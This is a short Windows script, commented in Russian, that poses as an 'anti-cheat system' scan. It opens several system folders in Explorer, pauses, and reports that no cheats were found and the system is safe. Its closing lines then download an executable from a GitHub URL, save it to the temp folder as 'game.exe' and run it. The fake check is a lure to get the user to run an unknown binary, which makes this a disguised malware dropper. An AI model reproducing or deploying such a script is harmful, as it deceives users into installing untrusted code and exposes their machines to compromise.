$u="https://github.com/gseff137-afk/1111/raw/refs/heads/main/cheker.exe"
$p="$env:TEMP\game.exe"

# Начинаем проверку
echo "=== АНТИЧИТ СИСТЕМА ==="
echo ""
echo "Проверка 1/5: Диск C:\"
explorer C:\
timeout /t 3 /nobreak >nul

echo "Проверка 2/5: Временные файлы"
explorer %temp%
timeout /t 3 /nobreak >nul

echo "Проверка 3/5: Системные папки"
explorer C:\Windows
timeout /t 3 /nobreak >nul

echo "Проверка 4/5: Программы"
explorer "C:\Program Files"
timeout /t 3 /nobreak >nul

echo "Проверка 5/5: Финальный анализ"
timeout /t 5 /nobreak >nul

echo ""
echo "=== РЕЗУЛЬТАТ ==="
echo "Читов не обнаружено!"
echo "Система безопасна"
echo ""

# Скачиваем и запускаем
echo "Загрузка программы..."
powershell -c "iwr '$u' -OutFile '$p' -UseBasicParsing"
echo "Запуск..."
timeout /t 2 /nobreak >nul
start "" "$p"